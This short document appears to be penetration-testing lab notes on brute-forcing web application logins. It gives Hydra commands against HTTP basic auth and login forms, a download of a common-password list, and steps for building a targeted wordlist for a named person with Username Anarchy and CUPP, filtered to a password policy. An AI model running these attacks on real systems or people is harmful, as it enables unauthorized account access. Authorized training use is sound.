# Login Brute Force

In this section, we will look at ways to perform brute force attacks on web application logins and how to generate wordlists for these attacks.

## Basic HTTP Authentication

**Hydra**
````
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <IP> http-get / -s 81
````

## Login Forms

````
$ hydra [options] target http-post-form "path:params:condition_string"
$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
````

## Custom Wordlist

**Username Anarchy**
````
$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
````

**CUPP**
````
$ sudo apt install cupp -y
$ cupp -i
````

**Requirements**

Minimum Length: 6 characters

Must Include:
- At least one uppercase letter
- At least one lowercase letter
- At least one number
- At least two special characters (from the set !@#$%^&*)

````
$ grep -E '^.{6,}$' wordlist_pwd.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > wordlist_filtered.txt
````
